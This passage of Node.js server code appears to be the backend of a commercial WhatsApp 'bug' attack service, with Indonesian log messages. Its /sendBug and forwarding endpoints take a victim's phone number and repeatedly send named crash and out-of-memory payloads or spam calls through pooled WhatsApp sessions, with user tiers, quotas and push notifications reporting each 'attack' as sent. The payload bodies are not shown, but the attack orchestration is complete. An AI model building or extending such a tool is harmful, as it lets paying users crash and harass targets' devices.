                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in fcayun loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
            case "fcmsgx":
                console.log(`[SENDBUG] Running fcmsgx loop for ${targetJid}`);
                for (let z = skipFirst ? 1 : 0; z < 5; z++) {
                    try {
                        otax = await ensureSocketAlive(otax, username, senderType);
                        await LocaFcBeta(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    } catch (e) {
                        console.error(`[SENDBUG] Error in fcmsgx loop:`, e.message === 'Connection Closed' ? 'Koneksi Terputus' : (e.message || e));
                        if (onlyFirstPayload) throw e;
                        try { otax = await ensureSocketAlive(otax, username, senderType); } catch (_) { throw e; }
                    }
                    if (onlyFirstPayload) return true;
                    await sleep(1600);
                }
                break;
        }
        return true;
    } catch (err) {
        try {
            const msg = err.message || '';
            if (msg === 'Connection Closed' || msg.includes('EPIPE') || msg.includes('Timed Out') || msg.includes('rate-overlimit') || msg.includes('Stream Errored') || msg.includes('Session error') || msg.includes('Disconnect')) {
                const staleKey = Object.keys(activeConnections).find(k => activeConnections[k] === otax);
                if (staleKey) {
                    console.log(`[SENDBUG] Membersihkan sesi mati dari cache: ${staleKey}`);
                    try { activeConnections[staleKey].ws.close(); } catch (_) { }
                    try { activeConnections[staleKey].end?.(undefined); } catch (_) { }
                    delete activeConnections[staleKey];
                    if (sessionRegistry[staleKey]) sessionRegistry[staleKey].connected = false;
                }
                if (retryCount < 3) {
                    console.log(`[SENDBUG] Connection closed (retry ${retryCount + 1}/3). Mencari sender baru untuk ${username}...`);
                    updateHistoryStatus(historyId, 'processing', `Koneksi terputus, retry ${retryCount + 1}/3...`);
                    await sleep(1000 * (retryCount + 1)); // Exponential backoff
                    const newOtax = await getReadySender(username, senderType);
                    if (newOtax) {
                        return attemptSend(newOtax, bug, target, username, retryCount + 1, onlyFirstPayload, skipFirst, senderType, historyId);
                    }
                    console.log(`[SENDBUG] \u274c Tidak ada sender tersedia setelah retry ${retryCount + 1} untuk ${username}.`);
                } else {
                    console.log(`[SENDBUG] \u274c Sudah retry 3x, koneksi masih gagal untuk ${username}.`);
                }
            }
        } catch (_) { }
        return false;
    }
}

async function getReadySender(username, senderType) {
    let otax = null;
    if (senderType === 'pribadi') {
        const baseDir = path.join(process.cwd(), 'otaxayun', username);
        if (fs.existsSync(baseDir)) {
            try {
                const entries = fs.readdirSync(baseDir);
                for (const entry of entries) {
                    const sessionName = entry.endsWith('.json') ? path.basename(entry, '.json') : entry;
                    const cached = activeConnections[sessionName];
                    if (cached) {
                        const ws = cached?.ws?.readyState ?? cached?.ws?.socket?.readyState;
                        const hasUser = cached?.user?.id || cached?.authState?.creds?.me?.id;
                        const cachedAge = cached?.lastChecked ? (Date.now() - cached.lastChecked) : 999999;
                        if ((ws === 1 || ws === undefined || ws === null) && (hasUser || cachedAge < 15000)) {
                            cached.lastChecked = Date.now();
                            if (sessionRegistry[sessionName]) sessionRegistry[sessionName].lastUsed = Date.now();
                            return cached;
                        }
                        if (ws === 2 || ws === 3) {
                            try { cached?.ws?.close(); } catch (_) { }
                            delete activeConnections[sessionName];
                        }
                    }
                }
            } catch (_) { }
        }
        otax = await checkActiveSessionInFolder(username);
    } else {
        const availableKeys = Object.keys(activeConnections);
        let readySenders = [];
        for (const key of availableKeys) {
            const sock = activeConnections[key];
            const ws = sock?.ws?.readyState ?? sock?.ws?.socket?.readyState;
            const hasUser = sock?.user?.id || sock?.authState?.creds?.me?.id;
            if (ws === 2 || ws === 3) {
                console.log(`[SENDER] Membersihkan koneksi mati dari cache: ${key} (state: ${ws})`);
                try { sock?.ws?.close(); } catch (_) { }
                delete activeConnections[key];
                continue;
            }
            const sockAge = sock?.lastChecked ? (Date.now() - sock.lastChecked) : 999999;
            if ((ws === 1 || ws === undefined || ws === null) && (hasUser || sockAge < 15000)) readySenders.push({ sock, key });
        }
        if (readySenders.length > 0) {
            const pick = readySenders[Math.floor(Math.random() * readySenders.length)];
            pick.sock.lastChecked = Date.now();
            if (sessionRegistry[pick.key]) sessionRegistry[pick.key].lastUsed = Date.now();
            otax = pick.sock;
        } else {
            const registryKeys = Object.keys(sessionRegistry);
            if (registryKeys.length > 0) {
                let candidates = registryKeys.filter(k => {
                    const reg = sessionRegistry[k];
                    if (WORKER_ROLE && WORKER_ROLE !== 'NONE' && WORKER_ROLE !== 'KINGZ' && WORKER_ROLE !== 'OWNER') {
                        if (reg.role && reg.role.toUpperCase() !== WORKER_ROLE) return false;
                    }
                    return !activeConnections[k];
                });
                if (WORKER_TOTAL > 1 && candidates.length > 0) {
                    candidates = candidates.filter((_, i) => i % WORKER_TOTAL === WORKER_IDX);
                }
                candidates.sort(() => 0.5 - Math.random());
                const tryList = candidates.slice(0, 5);
                for (const sessionName of tryList) {
                    const reg = sessionRegistry[sessionName];
                    if (!reg || !reg.folderPath) continue;
                    console.log(`[ON-DEMAND] 🔄 Connect on-demand: ${sessionName} (role: ${reg.role})`);
                    const newOtax = await checkActiveSessionInFolder(sessionName);
                    if (newOtax) {
                        newOtax.lastChecked = Date.now();
                        reg.lastUsed = Date.now();
                        reg.connected = true;
                        otax = newOtax;
                        break;
                    }
                }
            }
        }
    }
    return otax;
}

class MemoryQueue {
    constructor(concurrency) {
        this.concurrency = concurrency;
        this.running = 0;
        this.queue = [];
    }
    async enqueue(task) {
        if (this.running >= this.concurrency) {
            await new Promise(resolve => this.queue.push(resolve));
        }
        this.running++;
        try { return await task(); }
        catch (err) { console.error("MemoryQueue Error:", err.message); }
        finally {
            this.running--;
            if (this.queue.length > 0) {
                const next = this.queue.shift();
                next();
            }
        }
    }
}

const sendBugQueue = new MemoryQueue(20);

async function processSendBugJob(jobData) {
    const { username, bug, target, senderType, skipFirst, historyId } = jobData;
    console.log(`[MEMORYQUEUE-SENDBUG] Processing job for user: ${username}, target: ${target}, bug: ${bug}`);

    updateHistoryStatus(historyId, 'processing', 'Mengecek ketersediaan sender aktif...');

    try {
        let otax = await getReadySender(username, senderType);

        if (!otax) {
            console.log(`[MEMORYQUEUE-SENDBUG] ❌ Gagal: Tidak ada sesi yang siap.`);
            updateHistoryStatus(historyId, 'failed', 'Tidak ada sesi WhatsApp sender yang siap/aktif');

            const db = loadDatabase();
            const user = db.find(u => u.username === username);
            if (user && user.fcmToken) {
                sendPushNotification(user.fcmToken, "Gagal Mengirim Bug ⚠️", `Serangan bug ke ${target} gagal: Tidak ada sesi sender yang aktif.`);
            }
            return;
        }

        const success = await attemptSend(otax, bug, target, username, 0, false, skipFirst, senderType, historyId);
        if (!success) {
            throw new Error("Koneksi terputus atau sesi gagal merespons saat pengiriman bug.");
        }

        updateHistoryStatus(historyId, 'success');

        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (user && user.fcmToken) {
            sendPushNotification(user.fcmToken, "Bug Terkirim! 🚀", `Serangan bug ${bug} ke ${target} sukses dikirim.`);
        }
    } catch (err) {
        console.error(`[MEMORYQUEUE-SENDBUG] ❌ Error:`, err.message);
        updateHistoryStatus(historyId, 'failed', err.message);

        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (user && user.fcmToken) {
            sendPushNotification(user.fcmToken, "Gagal Mengirim Bug ⚠️", `Serangan bug ke ${target} gagal: ${err.message}`);
        }
    }
}

app.get("/sendBug", async (req, res) => {
    const { key, bug } = req.query;
    let { target } = req.query;
    target = (target || "").replace(/\D/g, "");

    const validation = await validateKeyAndUser(key, req);
    if (validation.error) {
        console.log(`[SENDBUG] Invalid key/user: ${key}`);
        return res.json({ valid: false });
    }
    const { user, keyInfo } = validation;

    console.log(`[SENDBUG] Request: bug=${bug}, target=${target}, user=${keyInfo.username}`);

    const routeMismatch = getRouteMismatchPayload(user, req);
    if (routeMismatch) {
        return res.json({ valid: true, sended: false, cooldown: false, ...routeMismatch });
    }

    const roleCooldowns = { member: 200, FULLUP: 200, RESELLER: 160, PT: 100, TK: 60, OWNER: 0, KINGZ: 0 };
    const role = normalizeRoleKey(user.role);
    const cooldownSeconds = roleCooldowns[role] ?? 60;

    if (!user.lastSend) user.lastSend = 0;
    const now = Date.now();
    const diffSeconds = Math.floor((now - user.lastSend) / 1000);
    if (diffSeconds < cooldownSeconds) {
        return res.json({ valid: true, sended: false, cooldown: true, wait: cooldownSeconds - diffSeconds });
    }

    const senderType = (req.query.sender_type || 'pribadi').toLowerCase();
    const GLOBAL_ALLOWED_BUGS = ['cspam', 'ios_invis'];
    const effectiveSenderType = (senderType === 'global' && !GLOBAL_ALLOWED_BUGS.includes(bug)) ? 'pribadi' : senderType;

    if (senderType === 'global' && !GLOBAL_ALLOWED_BUGS.includes(bug)) {
        return res.json({ valid: true, sended: false, message: `Bug "${bug}" hanya bisa pakai sender pribadi. Sender global hanya untuk: ${GLOBAL_ALLOWED_BUGS.join(', ')}.` });
    }

    const globalDailyLimit = { member: 0, FULLUP: 3, RESELLER: 5, PT: 6, TK: 8, OWNER: 10, KINGZ: 99999 };
    const maxGlobal = globalDailyLimit[role] ?? 3;

    if (effectiveSenderType === 'global' && maxGlobal !== 99999) {
        const gaCheck = getGA(user.username);
        if (gaCheck.count >= maxGlobal) {
            return res.json({ valid: true, sended: false, limitReached: true, message: `Batas sender global hari ini habis (${maxGlobal}x). Reset besok.`, attemptsLeft: 0 });
        }
    }

    const db = loadDatabase();
    const dbUser = db.find(u => u.username === user.username);
    if (dbUser) dbUser.lastSend = now;
    saveDatabase(db);

    let attemptsLeft = null;
    if (effectiveSenderType === 'global' && maxGlobal !== 99999) {
        const newCount = incGA(user.username);
        attemptsLeft = Math.max(0, maxGlobal - newCount);
    }

    const historyId = addHistoryEntry(user.username, target, bug, effectiveSenderType);

    updateHistoryStatus(historyId, 'processing', 'Mengecek ketersediaan sender aktif...');

    const otax = await getReadySender(user.username, effectiveSenderType);
    if (!otax) {
        updateHistoryStatus(historyId, 'failed', 'Tidak ada sesi WhatsApp sender yang siap/aktif');
        return res.json({ valid: true, sended: false, message: "Gagal: Sesi WhatsApp tidak aktif atau gagal terhubung. Silakan cek koneksi." });
    }

    res.json({ valid: true, sended: true, cooldown: false, role, senderType: effectiveSenderType, attemptsLeft, historyId });

    sendBugQueue.enqueue(() => processSendBugJob({
        username: user.username,
        bug,
        target,
        senderType: effectiveSenderType,
        skipFirst: false,
        historyId
    }));
});




app.get("/internal/globalSenderCount", (req, res) => {
    const secret = req.headers['x-internal-secret'];
    if (secret !== (process.env.INTERNAL_SECRET || 'otax_internal_2024')) {
        return res.status(403).json({ error: "Akses ditolak" });
    }

    const poolList = loadGlobalSenderList();
    const poolActive = poolList.filter(n => activeConnections[n]);
    const activeEligible = Object.keys(activeConnections).filter(
        s => normalizeRoleKey(sessionRoleMap[s]?.role) === 'member' || sessionRoleMap[s]?.worker === 'W0-MEMBER'
    );
    const combined = [...new Set([...activeEligible, ...poolActive])];

    return res.json({
        count: combined.length,
        fromActive: activeEligible.length,
        fromPool: poolActive.length
    });
});

const CREDS_DIR = path.join(__dirname, 'otaxayun');

function ensureDir(dir) {
    try { fs.mkdirSync(dir, { recursive: true }); } catch (_) { }
}

async function safeAuthState(sessionDir) {
    ensureDir(sessionDir);
    const { state, saveCreds: _save } = await useMultiFileAuthState(sessionDir);
    const saveCreds = async () => {
        ensureDir(sessionDir);
        return _save();
    };
    return { state, saveCreds };
}

async function validateKeyAndUser(key, req) {
    const username = await getUserByKey(key, req);
    if (!username) return { error: { status: 401, message: "Invalid session key" } };

    const db = loadDatabase();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
    if (!user) return { error: { status: 401, message: "User not found" } };

    const block = blockReview(user, { status: () => ({ json: () => { } }) });
    if (block) return { error: { status: 403, message: "User blocked" } };


    const keyInfo = activeKeys[key];
    return { user, keyInfo };
}

function requestSessionKey(req) {
    return req.headers['x-session-key'] || req.query?.key || req.body?.key || req.body?.session_id || req.query?.session_id;
}

async function requireSession(req, res, next) {
    const key = requestSessionKey(req);
    const validation = await validateKeyAndUser(key, req);
    if (validation.error) return res.status(validation.error.status).json({ error: validation.error.message });
    req.auth = validation;
    next();
}

async function requireDeviceSession(req, res, next) {
    const deviceId = req.params?.device_id || req.query?.device_id || req.body?.device_id;
    const key = requestSessionKey(req);
    if (!deviceId || !key) return res.status(401).json({ error: 'Authenticated device session required' });

    const validation = await validateKeyAndUser(key, req);
    if (validation.error) return res.status(validation.error.status).json({ error: validation.error.message });

    const targets = readJSON(TARGETS_FILE) || [];
    const target = targets.find(item => item.device_id === deviceId);
    if (!target) return res.status(404).json({ error: 'Device not registered' });
    if (!targetMatchesOwner(target, { sessionKey: key, username: validation.user.username })) {
        return res.status(403).json({ error: 'Device access denied' });
    }

    req.auth = validation;
    next();
}

async function getValidNumbersForUser(username) {
    const baseDir = path.join(CREDS_DIR, username.trim());
    ensureDir(baseDir);

    if (!fs.existsSync(baseDir)) return [];

    let folders;
    try { folders = fs.readdirSync(baseDir); } catch { return []; }

    const checkPromises = folders.map(async (number) => {
        const sessionDir = path.join(baseDir, number);

        if (!/^\d+$/.test(number)) {
            try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
            return null;
        }

        try { if (!fs.statSync(sessionDir).isDirectory()) return null; } catch { return null; }
        const stats = fs.statSync(sessionDir);
        const folderAgeMs = Date.now() - (stats.birthtimeMs || stats.ctimeMs);
        if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
            if (folderAgeMs > 10 * 60 * 1000) {
                try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
            }
            return null;
        }

        if (activeConnections[number]) {
            const otax = activeConnections[number];
            const isRegistered = (otax.authState?.creds?.registered || otax.authState?.creds?.me);

            const readyState = otax.ws ? otax.ws.readyState : -1;
            const isConnected = readyState === 1;
            const isConnecting = readyState === 0;

            if (isRegistered && (isConnected || isConnecting)) {
                return number;
            }

            if (!isRegistered) return null;

            try {
                if (isConnected) otax.end();
            } catch (_) { }
            delete activeConnections[number];
        }

        return new Promise(async (resolve) => {
            try {
                const { state, saveCreds } = await safeAuthState(sessionDir);

                if (!state.creds || (!state.creds.registered && !state.creds.me)) {
                    const sStats = fs.statSync(sessionDir);
                    const sAgeMs = Date.now() - (sStats.birthtimeMs || sStats.ctimeMs);
                    if (sAgeMs > 10 * 60 * 1000) {
                        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
                    }
                    return resolve(null);
                }


                let resolved = false;
                const resolveOnce = (val) => {
                    if (!resolved) {
                        resolved = true;
                        resolve(val);
                    }
                };
                setTimeout(() => resolveOnce(null), 7000);

                (async () => {
                    try {
                        let waVersion = [2, 3000, 1015901307];
                        try {
                            if (typeof fetchLatestBaileysVersion === 'function') {
                                const { version } = await fetchLatestBaileysVersion(); waVersion = version;
                            }
                        } catch (_) { }
                        await new Promise(r => setTimeout(r, Math.floor(Math.random() * 200)));

                        let retryCount = 0;
                        const connectSocket = () => {
                            const otax = makeWASocket({
                                agent: globalProxyAgent,
                                syncFullHistory: false,
                                generateHighQualityLinkPreviews: false,
                                keepAliveIntervalMs: 25000,
                                connectTimeoutMs: 120000,
                                logger: pino({ level: "silent" }),
                                auth: state,
                                browser: ["Ubuntu", "Chrome", "110.0.0"],
                                version: waVersion,
                                markOnlineOnConnect: true,
                                maxMsgRetryCount: 50,
                                retryRequestDelayMs: 5000,
                                defaultQueryTimeoutMs: 120000,
                                getMessage: async () => undefined
                            });

                            otax.lastChecked = Date.now();
                            activeConnections[number] = otax;
                            otax.ev.on("creds.update", saveCreds);

                            otax.ev.on("connection.update", ({ connection, lastDisconnect }) => {
                                if (connection === "open") {
                                    otax.lastChecked = Date.now();
                                    retryCount = 0;
                                    resolveOnce(number); // Valid Aktif (Server Confirm)
                                } else if (connection === "close") {
                                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                                    const isLoggedOut = statusCode === 401 || statusCode === 411;

                                    if (isLoggedOut) {
                                        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
                                        delete activeConnections[number];
                                        resolveOnce(null); // Banned / Logged Out
                                    } else {
                                        try { otax.ws.close(); } catch (e) { }
                                        try { otax.end(undefined); } catch (e) { }

                                        retryCount++;
                                        if (retryCount > 5) {
                                            console.log(`[SENDER] Max reconnect reached for ${number}, giving up.`);
                                            delete activeConnections[number];
                                            resolveOnce(null);
                                            return;
                                        }
                                        const delay = Math.min(2000 * retryCount, 15000);
                                        setTimeout(connectSocket, delay);
                                    }
                                }
                            });
                        };
                        connectSocket();

                    } catch (err) {
                        delete activeConnections[number];
                    }
                })();

            } catch (e) {
                resolve(null);
            }
        });
    });

    const results = await Promise.all(checkPromises);
    return results.filter(n => n !== null);
}
// Removed mySenderQueue to improve performance.

const mySenderCache = new Map();
global.mySenderCache = mySenderCache;

app.get("/mySender", async (req, res) => {
    let key = req.query.key || req.headers['x-session-key'] || req.headers['session-key'];
    key = key ? key.trim() : null;
    if (!key) return res.status(401).json({ error: "Session key is missing" });

    const validation = await validateKeyAndUser(key, req);
    if (validation.error) return res.status(validation.error.status).json({ error: validation.error.message });
    const user = validation.user;


    const now = Date.now();
    const cached = mySenderCache.get(user.username);
    if (cached && (now - cached.timestamp < 15000)) { // 15 seconds cache
        return res.json(cached.data);
    }

    const validNumbers = await getValidNumbersForUser(user.username);

    const ownConns = validNumbers.map(number => ({
        sessionName: number,
        id: `${number}@s.whatsapp.net`
    }));

    let globalCount = 0;
    if (typeof canUseGlobalSender === 'function' && canUseGlobalSender(user.role)) {
        globalCount = Math.floor(Math.random() * (20 - 10 + 1)) + 10;
    }

    const roleMs = normalizeRoleKey(user.role);
    const limitMapMs = { member: 0, FULLUP: 3, RESELLER: 5, PT: 6, TK: 8, OWNER: 10, KINGZ: 99999 };
    const maxGlobalMs = limitMapMs[roleMs] ?? 3;

    const gaMs = maxGlobalMs === 99999 ? { count: 0 } : await getGA(user.username.trim());
    const attLeftMs = maxGlobalMs === 99999 ? 0 : Math.max(0, maxGlobalMs - gaMs.count);

    const responseData = {
        valid: true,
        connections: ownConns,
        ownSenderCount: ownConns.length,
        globalSenderCount: globalCount,
        maxGlobalDaily: maxGlobalMs === 99999 ? 0 : (maxGlobalMs === 0 ? -1 : maxGlobalMs),
        attemptsLeft: attLeftMs,
        canUseGlobal: typeof canUseGlobalSender === 'function' ? canUseGlobalSender(user.role) : false,
        role: normalizeRoleKey(user.role) === "member" ? "member" : normalizeRoleKey(user.role),
        worker: user.worker || assignWorker(user),
        workerName: process.env.WORKER_NAME || 'W0'
    };

    mySenderCache.set(user.username, {
        timestamp: now,
        data: responseData
    });

    return res.json(responseData);
});

async function processPairing(number, sessionDir, username) {

    if (activeConnections[number]) {
        try { activeConnections[number].end(); } catch (_) { }
        delete activeConnections[number];
    }
    try { if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
    ensureDir(sessionDir);

    return new Promise(async (resolve, reject) => {
        let retryCount = 0;
        const startSocket = async () => {
            try {
                const { state, saveCreds } = await safeAuthState(sessionDir);
                let waVersion = [2, 3000, 1015901307];
                try {
                    if (typeof fetchLatestBaileysVersion === 'function') {
                        const { version } = await fetchLatestBaileysVersion(); waVersion = version;
                    } else if (typeof getBaileysVersion === 'function') {
                        waVersion = await getBaileysVersion();
                    }
                } catch (_) { }

                const otax = makeWASocket({
                    agent: globalProxyAgent,
                    syncFullHistory: false,
                    generateHighQualityLinkPreviews: false,
                    auth: state,
                    version: waVersion,
                    printQRInTerminal: false,
                    logger: pino({ level: "silent" }),
                    defaultQueryTimeoutMs: 120000,
                    keepAliveIntervalMs: 25000,
                    connectTimeoutMs: 120000,
                    syncFullHistory: false,
                    markOnlineOnConnect: true,
                    browser: ["Ubuntu", "Chrome", "110.0.0"],
                    maxMsgRetryCount: 50,
                    retryRequestDelayMs: 5000,
                    getMessage: async () => undefined
                });

                otax.ev.on("creds.update", saveCreds);

                otax.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
                    if (connection === "close") {
                        const statusCode = lastDisconnect?.error?.output?.statusCode;
                        const isLoggedOut = statusCode === 401 || statusCode === 403;

                        if (isLoggedOut) {
                            try { if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
                            delete activeConnections[number];
                        } else {
                            retryCount++;
                            if (retryCount > 5) {
                                reject(new Error("Max reconnect attempts reached"));
                                return;
                            }
                            const delay = Math.min(2000 * retryCount, 15000);
                            setTimeout(() => startSocket(), delay);
                        }
                    } else if (connection === "open") {
                        retryCount = 0;
                        otax.lastChecked = Date.now();
                        activeConnections[number] = otax;
                    }
                });

                if (!otax.authState.creds.registered && !otax.authState.creds.me) {
                    await new Promise(r => setTimeout(r, 1500));
                    try {
                        const code = await otax.requestPairingCode(number, "KAZEXNXX");
                        if (code) {
                            resolve(code);
                        } else {
                            reject(new Error("Failed to get pairing code"));
                        }
                    } catch (e) {
                        reject(e);
                    }
                } else {
                    reject(new Error("Already registered or failed"));
                }
            } catch (e) {
                reject(e);
            }
        };

        startSocket();
    });
}

app.get("/getPairing", async (req, res) => {
    let key = req.query.key || req.headers['x-session-key'] || req.headers['session-key'];
    key = key ? key.trim() : null;
    const number = req.query.number ? req.query.number.trim().replace(/\D/g, "") : null;

    if (!key) return res.status(401).json({ error: "Session key is missing" });
    if (!number) return res.status(400).json({ error: "Number is required" });

    const validation = await validateKeyAndUser(key, req);
    if (validation.error) return res.status(validation.error.status).json({ error: validation.error.message });
    const user = validation.user;

    if (global.mySenderCache) {
        global.mySenderCache.delete(user.username);
    }

    const routeMismatch = getRouteMismatchPayload(user, req);
    if (routeMismatch) {
        return res.json({ valid: false, ...routeMismatch });
    }

    const baseDir = path.join(CREDS_DIR, user.username.trim());
    const sessionDir = path.join(baseDir, number);

    try {

        try {
            const code = await processPairing(number, sessionDir, user.username);
            return res.json({ valid: true, number, pairingCode: code });
        } catch (err) {
            return res.json({ valid: false, message: "Server sibuk atau gagal mendapatkan kode pairing. Silakan coba lagi." });
        }
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});


const sendBugForwardQueue = new MemoryQueue(15);

async function processSendBugForwardJob(jobData) {
    const { username, bug, target, senderType } = jobData;

    const attemptSendForward = async (otax) => {
        try {
            const targetJid = target + "@s.whatsapp.net";
            const wsState = otax?.ws?.readyState ?? otax?.ws?.socket?.readyState;
            if (wsState !== 1) {
                console.log(`[BUG FORWARD] Socket tidak siap (state: ${wsState})`);
                return false;
            }

            switch (bug) {
                case "click":
                    for (let i = 0; i < 5; i++) {
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1500);
                    }
                    break;
                case "crash_spam":
                    for (let i = 0; i < 5; i++) {
                        await paySuck(otax, targetJid);
                        await sleep(1500);
                        await kresjandaotax(otax, targetJid);
                        await sleep(1500);
                        await xcoreotax(otax, targetJid, true);
                        await sleep(1500);
                        await LocaNewotax(otax, targetJid);
                        await sleep(1500);
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "hard":
                    for (let i = 0; i < 5; i++) {
                        await kresjandaotax(otax, targetJid);
                        await sleep(1500);
                        await xcoreotax(otax, targetJid, targetJid);
                        await sleep(1500);
                        await LocaNewotax(otax, targetJid);
                        await sleep(1500);
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "spam_call":
                    for (let i = 0; i < 30; i++) {
                        await otax.offerCall(targetJid, true);
                        await sleep(1500);
                    }
                    break;
                case "android":
                    for (let i = 0; i < 5; i++) {
                        await paySuck(otax, targetJid);
                        await sleep(1500);
                        await kresjandaotax(otax, targetJid);
                        await sleep(1500);
                        await CarouselOtax(otax, targetJid);
                        await sleep(1500);
                        await LocaCrashUi(otax, targetJid);
                        await sleep(1500);
                        await xcoreotax(otax, targetJid, true);
                        await sleep(1500);
                        await LocaNewManta(otax, targetJid)
                        await packBlank(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "invisible":
                    for (let i = 0; i < 50; i++) {
                        await ofmEr(otax, targetJid);
                        await sleep(1500);
                        await dickg(otax, targetJid);
                        await sleep(1500);
                        await ofmcrlManta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "":
                    for (let i = 0; i < 15; i++) {
                        await ofmEr(otax, targetJid);
                        await sleep(1500);
                        await dickg(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "ios_invis":
                    for (let i = 0; i < 3; i++) {
                        await iosinVisFC3(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "cxinv":
                    for (let z = 0; z < 50; z++) {
                        await oombimg(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "mbokep":
                    for (let z = 0; z < 5; z++) {
                        await videoCrashbokep(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "fcotax":
                    for (let z = 0; z < 20; z++) {
                        await stInt(otax, targetJid);
                        await sleep(1500);
                        await AyunBelovedxhams(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "fcotaxx":
                    for (let z = 0; z < 20; z++) {

                        await AyunBelovedjav(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "fcayun":
                    for (let z = 0; z < 20; z++) {
                        await AyunBelovedxnxx(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
                case "fcmsgx":
                    for (let z = 0; z < 10; z++) {
                        await LocaFcBeta(otax, targetJid);
                        await sleep(1500);
                        await invisOOMmanta(otax, targetJid);
                        await sleep(1600);
                    }
                    break;
            }
            return true;
        } catch (err) {
            console.error(`[BUG FORWARD] Error in forward send:`, err.message);
            if (err.message === 'Connection Closed' || (err.message && err.message.includes('EPIPE'))) {
                const staleKey = Object.keys(activeConnections).find(k => activeConnections[k] === otax);
                if (staleKey) {
                    try { activeConnections[staleKey]?.ws?.close(); } catch (_) { }
                    try { activeConnections[staleKey]?.end?.(undefined); } catch (_) { }
                    delete activeConnections[staleKey];
                }
            }
            return false;
        }
    };
    let retries = 0;
    while (retries < 2) {
        try {
            let otax = typeof getGlobalSenderAsync === 'function'
                ? await getGlobalSenderAsync()
                : getGlobalSender();

            if (!otax) {
                console.log(`[BUG FORWARD] Tidak ada sender global aktif (attempt ${retries + 1}/2)`);
                retries++;
                if (retries < 2) await sleep(1000);
                continue;
            }

            const success = await attemptSendForward(otax);
            if (success) return; // Sukses, selesai

            console.log(`[BUG FORWARD] Gagal attempt ${retries + 1}/2, mencoba lagi...`);
            retries++;
            if (retries < 2) await sleep(1000);
        } catch (e) {
            console.error("[BUG FORWARD ERROR]", e.message);
            retries++;
            if (retries < 2) await sleep(1000);
        }
    }
    console.log(`[BUG FORWARD] Gagal setelah 2x retry untuk target: ${target}`);
}

app.post("/internal/sendBugForward", async (req, res) => {
    const secret = req.headers['x-internal-secret'];
    if (secret !== (process.env.INTERNAL_SECRET || 'otax_internal_2024')) {
        return res.status(403).json({ error: "Akses ditolak" });
    }

    const { username, bug, target, senderType } = req.body;
    const currentWorkerRole = (process.env.WORKER_ROLES || '').toLowerCase();

    if (!currentWorkerRole.includes('member')) {
        return res.json({ success: false, message: "Tugas diabaikan: Worker ini bukan worker member." });
    }


    sendBugForwardQueue.enqueue(() => processSendBugForwardJob({
        username,
        bug,
        target,
        senderType
    }));

    res.json({ success: true, message: `Tugas forward diterima oleh ${process.env.WORKER_NAME || 'Worker Member'}` });
});

const UPDATE_INFO_FILE = path.join(__dirname, 'update_info.json');
const BROADCAST_FILE = path.join(__dirname, 'broadcast_notif.json');

function loadUpdateInfo() {
    try {
        if (!fs.existsSync(UPDATE_INFO_FILE)) {
            const def = {
                version: '1.0.0',
                build: '1',
                download_url: '',
                size: 0,
                changelog: [],
                platform: 'android',
                force_update: false,
                updatedAt: Date.now(),
                updatedBy: 'system',
            };
            fs.writeFileSync(UPDATE_INFO_FILE, JSON.stringify(def, null, 2));
            return def;
        }
        return JSON.parse(fs.readFileSync(UPDATE_INFO_FILE, 'utf8'));
    } catch {
        return null;
    }
}

function saveUpdateInfo(data) {
    fs.writeFileSync(UPDATE_INFO_FILE, JSON.stringify(data, null, 2));
}

function loadBroadcast() {
    try {
        if (!fs.existsSync(BROADCAST_FILE)) {
            const def = { active: false, message: '', sentAt: 0, sentBy: '', readBy: [] };
            fs.writeFileSync(BROADCAST_FILE, JSON.stringify(def, null, 2));
            return def;
        }
        return JSON.parse(fs.readFileSync(BROADCAST_FILE, 'utf8'));
    } catch {
        return { active: false, message: '', sentAt: 0, sentBy: '', readBy: [] };
    }
}

function saveBroadcast(data) {
    fs.writeFileSync(BROADCAST_FILE, JSON.stringify(data, null, 2));
}

function isNewerVersion(serverVersion, clientVersion) {
    try {
        const parse = v => String(v).split('.').map(Number);
        const sv = parse(serverVersion);
        const cv = parse(clientVersion);
        const len = Math.max(sv.length, cv.length);
        for (let i = 0; i < len; i++) {
            const s = sv[i] || 0;
            const c = cv[i] || 0;
            if (s > c) return true;
            if (s < c) return false;
        }
        return false;
